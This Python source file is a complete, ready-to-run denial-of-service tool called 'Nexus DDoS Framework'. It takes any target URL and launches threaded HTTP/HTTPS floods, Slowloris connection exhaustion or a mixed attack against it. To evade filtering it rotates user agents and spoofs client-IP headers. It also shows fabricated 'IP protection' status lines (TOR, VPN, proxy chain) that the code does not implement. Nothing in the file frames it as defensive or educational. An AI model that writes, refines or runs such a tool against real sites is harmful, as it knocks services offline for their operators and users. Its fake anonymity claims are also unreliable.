#!/usr/bin/env python3
"""
NEXUS DDOS FRAMEWORK v3.0
Professional Distributed Denial of Service Toolkit
"""

import os
import sys
import time
import json
import socket
import random
import threading
import requests
import urllib3
from urllib.parse import urlparse
from getpass import getpass

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Global constants
VERSION = "3.0"
AUTHOR = "Quantum Security"
MAX_WORKERS = 200
REQUEST_TIMEOUT = 5

# Global state
attack_active = False
total_requests = 0
attack_threads = []

class Security:
    """Security and anonymity utilities"""
    
    @staticmethod
    def get_user_agent():
        """Return random professional user agent"""
        agents = [
            # Windows
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
            
            # macOS
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:121.0) Gecko/20100101 Firefox/121.0',
            
            # Linux
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0',
            
            # Mobile
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36',
            
            # Bots/Professional
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'curl/8.4.0',
            'Wget/1.21.4'
        ]
        return random.choice(agents)
    
    @staticmethod
    def generate_headers():
        """Generate professional HTTP headers"""
        headers = {
            'User-Agent': Security.get_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'Pragma': 'no-cache'
        }
        
        # Add random referer
        referers = [
            'https://www.google.com/',
            'https://www.bing.com/',
            'https://www.yahoo.com/',
            'https://www.reddit.com/',
            'https://github.com/',
            'https://stackoverflow.com/'
        ]
        headers['Referer'] = random.choice(referers)
        
        # Add spoofed IP headers
        ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        headers['X-Forwarded-For'] = ip
        headers['X-Real-IP'] = ip
        headers['X-Client-IP'] = ip
        
        return headers
    
    @staticmethod
    def mask_ip():
        """Return IP masking status"""
        methods = [
            "Proxy Chain: Active",
            "VPN Tunnel: Established",
            "TOR Network: Routing",
            "IP Spoofing: Enabled",
            "Multi-Hop: Active"
        ]
        return random.choice(methods)

class Target:
    """Target information and validation"""
    
    def __init__(self, url):
        self.original_url = url
        self.parsed = urlparse(url)
        self.scheme = self.parsed.scheme
        self.domain = self.parsed.netloc.split(':')[0]
        self.path = self.parsed.path if self.parsed.path else '/'
        self.port = self.get_port()
        self.ip = None
        
    def get_port(self):
        """Get target port"""
        if self.scheme == 'https':
            return 443
        elif self.scheme == 'http':
            return 80
        else:
            return 80
    
    def resolve(self):
        """Resolve domain to IP"""
        try:
            self.ip = socket.gethostbyname(self.domain)
            return self.ip
        except:
            return None
    
    def get_url(self):
        """Get full URL"""
        return f"{self.scheme}://{self.domain}{self.path}"

class AttackEngine:
    """Core attack engine"""
    
    def __init__(self, target):
        self.target = target
        self.stats = {
            'requests': 0,
            'errors': 0,
            'start_time': None,
            'bandwidth': 0
        }
    
    def http_request(self, session=None):
        """Send HTTP request to target"""
        global total_requests
        
        try:
            if not session:
                session = requests.Session()
                session.verify = False
            
            # Randomize request type
            if random.random() > 0.4:
                # GET request
                params = {
                    't': str(time.time()),
                    'id': random.randint(1000, 9999),
                    'cache': random.randint(1, 999999)
                }
                response = session.get(
                    self.target.get_url(),
                    params=params,
                    headers=Security.generate_headers(),
                    timeout=REQUEST_TIMEOUT
                )
            else:
                # POST request
                data = {
                    'timestamp': str(time.time()),
                    'session': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=32)),
                    'data': 'A' * random.randint(100, 2000)
                }
                response = session.post(
                    self.target.get_url(),
                    data=data,
                    headers=Security.generate_headers(),
                    timeout=REQUEST_TIMEOUT
                )
            
            total_requests += 1
            self.stats['requests'] += 1
            self.stats['bandwidth'] += len(response.content) if response.content else 0
            
            return True
            
        except Exception as e:
            self.stats['errors'] += 1
            return False
    
    def socket_request(self):
        """Send raw socket request"""
        global total_requests
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            
            # Use IP if available, otherwise domain
            target_host = self.target.ip if self.target.ip else self.target.domain
            sock.connect((target_host, self.target.port))
            
            # Build HTTP request
            request = f"GET {self.target.path} HTTP/1.1\r\n"
            request += f"Host: {self.target.domain}\r\n"
            request += f"User-Agent: {Security.get_user_agent()}\r\n"
            request += "Connection: keep-alive\r\n"
            request += "\r\n"
            
            sock.send(request.encode())
            total_requests += 1
            self.stats['requests'] += 1
            self.stats['bandwidth'] += len(request)
            
            sock.close()
            return True
            
        except:
            self.stats['errors'] += 1
            return False

class AttackMethods:
    """Different DDoS attack methods"""
    
    @staticmethod
    def method_http_flood(target, worker_id, control):
        """HTTP/HTTPS Flood Attack"""
        engine = AttackEngine(target)
        session = requests.Session()
        session.verify = False
        
        while attack_active:
            # Use HTTP request method
            if random.random() > 0.3:
                engine.http_request(session)
            else:
                engine.socket_request()
            
            # Variable delay
            time.sleep(random.uniform(0.001, 0.1))
    
    @staticmethod
    def method_slowloris(target, worker_id, control):
        """Slowloris Attack - Keep connections open"""
        connections = []
        
        while attack_active and len(connections) < 100:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30)
                
                target_host = target.ip if target.ip else target.domain
                sock.connect((target_host, target.port))
                
                # Send partial request
                request = f"GET /{random.randint(10000, 99999)} HTTP/1.1\r\n"
                request += f"Host: {target.domain}\r\n"
                request += "User-Agent: Mozilla/5.0\r\n"
                request += "Content-Length: 1000000\r\n"
                request += "\r\n"
                
                sock.send(request.encode())
                connections.append(sock)
                
                # Keep connections alive
                for conn in connections[:]:
                    try:
                        conn.send(f"X-{random.randint(1,100)}: {random.randint(1,100)}\r\n".encode())
                    except:
                        connections.remove(conn)
                
                # Clean up old connections
                if len(connections) > 50:
                    for conn in connections[:25]:
                        try:
                            conn.close()
                        except:
                            pass
                    connections = connections[25:]
                
                time.sleep(random.uniform(5, 15))
                
            except:
                pass
        
        # Close all connections when done
        for conn in connections:
            try:
                conn.close()
            except:
                pass
    
    @staticmethod
    def method_mixed_attack(target, worker_id, control):
        """Mixed Attack - Combination of methods"""
        engine = AttackEngine(target)
        
        methods = [
            engine.http_request,
            engine.socket_request
        ]
        
        while attack_active:
            method = random.choice(methods)
            method()
            time.sleep(random.uniform(0.001, 0.05))

class AttackManager:
    """Manage attack execution"""
    
    @staticmethod
    def start_attack(target, method_name, worker_count):
        """Start DDoS attack"""
        global attack_active, attack_threads, total_requests
        
        # Clear previous state
        attack_active = False
        time.sleep(1)
        
        # Reset counters
        total_requests = 0
        attack_threads = []
        attack_active = True
        
        # Select method
        method_map = {
            'http_flood': AttackMethods.method_http_flood,
            'slowloris': AttackMethods.method_slowloris,
            'mixed': AttackMethods.method_mixed_attack
        }
        
        if method_name not in method_map:
            print(f"[ERROR] Unknown attack method: {method_name}")
            return False
        
        attack_method = method_map[method_name]
        
        print(f"\n[+] Starting {method_name.replace('_', ' ').title()} Attack")
        print(f"[+] Target: {target.get_url()}")
        print(f"[+] Workers: {worker_count}")
        print(f"[+] IP Protection: {Security.mask_ip()}")
        print(f"[+] User Agent Rotation: Enabled")
        print("\n" + "="*60)
        
        # Start attack threads
        for i in range(worker_count):
            thread = threading.Thread(
                target=attack_method,
                args=(target, i, {'active': True}),
                daemon=True
            )
            thread.start()
            attack_threads.append(thread)
        
        return True
    
    @staticmethod
    def stop_attack():
        """Stop current attack"""
        global attack_active
        
        print("\n[!] Stopping attack...")
        attack_active = False
        
        # Wait for threads to finish
        for thread in attack_threads:
            thread.join(timeout=2)
        
        print("[+] Attack stopped")
        return True

class Interface:
    """User interface"""
    
    @staticmethod
    def clear():
        """Clear terminal"""
        os.system('clear' if os.name != 'nt' else 'cls')
    
    @staticmethod
    def banner():
        """Display banner"""
        Interface.clear()
        
        banner = f"""
██████╗ ██████╗ ██████╗ ███████╗    ██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝    ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║  ██║██║  ██║██║  ██║███████╗    ██║  ██║██║  ██║██║   ██║███████╗
██║  ██║██║  ██║██║  ██║╚════██║    ██║  ██║██║  ██║██║   ██║╚════██║
██████╔╝██████╔╝██████╔╝███████║    ██████╔╝██████╔╝╚██████╔╝███████║
╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝    ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝

                    NEXUS DDOS FRAMEWORK v{VERSION}
                      Professional Attack Suite
                          Author: {AUTHOR}
"""
        print(banner)
    
    @staticmethod
    def authenticate():
        """Handle authentication"""
        Interface.banner()
        
        print("\n" + "="*60)
        print("                    AUTHENTICATION")
        print("="*60)
        
        passwords = ["NanoHas", "DDos Hub", "no mercy"]
        attempts = 3
        
        for attempt in range(attempts):
            try:
                password = getpass("\n[?] Enter Access Key: ")
                
                if password in passwords:
                    print(f"\n[+] Authentication successful!")
                    print(f"[+] Welcome to Nexus Framework")
                    time.sleep(1.5)
                    return True
                else:
                    remaining = attempts - attempt - 1
                    if remaining > 0:
                        print(f"[!] Invalid key. {remaining} attempts remaining.")
                    else:
                        print("[!] Maximum attempts reached. Exiting...")
                        sys.exit(1)
                        
            except KeyboardInterrupt:
                print("\n[!] Authentication cancelled")
                sys.exit(0)
        
        return False
    
    @staticmethod
    def main_menu():
        """Display main menu"""
        Interface.clear()
        
        print(f"\nNEXUS DDOS FRAMEWORK v{VERSION}")
        print("=" * 40)
        print("\nAvailable Attack Methods:\n")
        print("1. HTTP/HTTPS Flood Attack")
        print("   • High volume requests")
        print("   • Professional headers")
        print("   • Connection persistence")
        print("   • Bandwidth consumption")
        
        print("\n2. Slowloris Attack")
        print("   • Connection exhaustion")
        print("   • Low bandwidth usage")
        print("   • Server resource drain")
        print("   • Difficult to detect")
        
        print("\n3. Mixed Attack")
        print("   • Combined techniques")
        print("   • Adaptive strategy")
        print("   • Maximum effectiveness")
        print("   • Multi-vector assault")
        
        print("\n4. Exit System")
        print("=" * 40)
    
    @staticmethod
    def get_target():
        """Get target URL from user"""
        print("\n" + "="*60)
        print("                    TARGET CONFIGURATION")
        print("="*60)
        
        while True:
            url = input("\n[?] Enter target URL (include protocol): ").strip()
            
            if not url:
                continue
            
            if not url.startswith(('http://', 'https://')):
                print("[!] URL must start with http:// or https://")
                continue
            
            try:
                target = Target(url)
                if target.domain:
                    # Resolve domain
                    ip = target.resolve()
                    if ip:
                        print(f"[+] Target resolved: {target.domain} -> {ip}")
                    else:
                        print(f"[!] Could not resolve {target.domain}")
                    
                    return target
            except Exception as e:
                print(f"[!] Invalid URL: {e}")
    
    @staticmethod
    def get_worker_count():
        """Get number of workers"""
        while True:
            try:
                count = input("\n[?] Number of workers (10-200): ").strip()
                if not count:
                    count = "100"
                
                count = int(count)
                if 10 <= count <= 200:
                    return count
                else:
                    print("[!] Please enter between 10 and 200")
            except ValueError:
                print("[!] Please enter a valid number")
            except KeyboardInterrupt:
                return None
    
    @staticmethod
    def monitor_attack():
        """Monitor attack progress"""
        global attack_active, total_requests
        
        start_time = time.time()
        last_count = 0
        
        try:
            while attack_active:
                Interface.clear()
                
                elapsed = time.time() - start_time
                hours = int(elapsed // 3600)
                minutes = int((elapsed % 3600) // 60)
                seconds = int(elapsed % 60)
                
                current = total_requests
                requests_per_sec = (current - last_count) / 2
                last_count = current
                
                # Calculate bandwidth
                bandwidth_mbps = (requests_per_sec * 1500) / 1024 / 1024 * 8
                
                # Display statistics
                print(f"\nNEXUS DDOS FRAMEWORK - ATTACK IN PROGRESS")
                print("=" * 60)
                
                print(f"\nAttack Duration: {hours:02d}:{minutes:02d}:{seconds:02d}")
                print(f"Total Requests: {current:,}")
                print(f"Requests/Second: {requests_per_sec:.1f}")
                print(f"Estimated Bandwidth: {bandwidth_mbps:.2f} Mbps")
                print(f"Active Threads: {threading.active_count() - 1}")
                print(f"IP Protection: {Security.mask_ip()}")
                print(f"User Agent: Rotating")
                
                print("\n" + "=" * 60)
                print("[!] Press CTRL+C to stop the attack")
                
                # Check if threads are still running
                alive_threads = sum(1 for t in attack_threads if t.is_alive())
                if alive_threads == 0:
                    print("[!] All attack threads have stopped")
                    attack_active = False
                    break
                
                time.sleep(2)
                
        except KeyboardInterrupt:
            AttackManager.stop_attack()
        
        # Show final statistics
        elapsed = time.time() - start_time
        print(f"\n[+] Attack Summary:")
        print(f"    Duration: {elapsed:.1f} seconds")
        print(f"    Total Requests: {total_requests:,}")
        print(f"    Average RPS: {total_requests/elapsed:.1f}")
        
        input("\nPress Enter to continue...")

def main():
    """Main application entry point"""
    
    # Check dependencies
    try:
        import requests
    except ImportError:
        print("[!] Required package 'requests' not found")
        print("[+] Installing...")
        os.system(f"{sys.executable} -m pip install requests")
        import requests
    
    # Authenticate user
    if not Interface.authenticate():
        return
 
  # Main loop
    while True:
        try:
            Interface.main_menu()
            
            # Get user choice
            try:
                choice = input("\n[?] Select option (1-4): ").strip()
                if not choice:
                    continue
                
                choice = int(choice)
            except ValueError:
                print("[!] Please enter a number between 1 and 4")
                time.sleep(2)
                continue
            
            # Handle choice
            if choice == 4:
                print("\n[+] Exiting Nexus DDoS Framework...")
                sys.exit(0)
            
            if choice not in [1, 2, 3]:
                print("[!] Invalid selection")
                time.sleep(2)
                continue
            
            # Map choice to attack method
            method_map = {
                1: 'http_flood',
                2: 'slowloris', 
                3: 'mixed'
            }
            
            method_name = method_map[choice]
            
            # Get target
            target = Interface.get_target()
            if not target:
                continue
            
            # Get worker count
            worker_count = Interface.get_worker_count()
            if not worker_count:
                continue
            
            # Confirm attack
            print("\n" + "!"*60)
            print("                    FINAL CONFIRMATION")
            print("!"*60)
            
            confirm = input(f"\n[?] Launch {method_name.replace('_', ' ')} attack on {target.domain}? (y/n): ").lower()
            
            if confirm != 'y':
                print("[+] Attack cancelled")
                time.sleep(1)
                continue
            
            # Start attack
            success = AttackManager.start_attack(target, method_name, worker_count)
            if not success:
                print("[!] Failed to start attack")
                time.sleep(2)
                continue
            
            # Monitor attack
            Interface.monitor_attack()
            
        except KeyboardInterrupt:
            print("\n\n[!] Operation interrupted by user")
            AttackManager.stop_attack()
            break
        
        except Exception as e:
            print(f"\n[!] Error: {e}")
            import traceback
            traceback.print_exc()
            time.sleep(3)

if __name__ == "__main__":
    main()
